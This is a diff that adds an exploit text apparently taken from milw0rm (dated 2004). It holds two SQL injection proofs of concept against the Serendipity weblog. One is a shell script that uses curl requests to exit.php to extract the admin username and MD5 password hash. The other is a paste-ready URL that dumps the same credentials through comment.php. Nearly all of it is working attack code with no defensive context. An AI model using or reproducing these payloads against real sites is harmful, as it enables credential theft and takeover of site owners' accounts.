@@ -1,0 +1,32 @@
+Proof of Concept 1
+------------------
+
+
+Usage: ./ser_sqli_poc.sh URL_to_Serendipity_Weblog
+
+
+ser_sqli_poc.sh
+---------8<-----------8<-------------
+#!/bin/sh
+
+
+echo -n "Username: "
+curl -I -s "$1/exit.php?url_id=1&entry_id=1%20and%200%20union%20select%20username%20from%20serendipity_authors%20where%20authorid%3D1"
+| grep Location | cut -b10-
+echo -n "MD5(password): "
+curl -I -s "$1/exit.php?url_id=1&entry_id=1%20and%200%20union%20select%20password%20from%20serendipity_authors%20where%20authorid%3D1"
+| grep Location | cut -b10-
+---------8<-----------8<-------------
+
+
+
+
+Proof of Concept 2
+------------------
+
+
+Copy&Paste this to your browser and edit URL_to_Serendipity_Weblog.
+
+http://URL_to_Serendipity_Weblog/comment.php?serendipity[type]=trackbacks&serendipity[entry_id]=0%20and%200%20union%20select%201,2,3,4,username,password,7,8,9,0,1,2,3%20from%20serendipity_authors%20where%20authorid=1%20/*
+
+# milw0rm.com [2004-09-28]
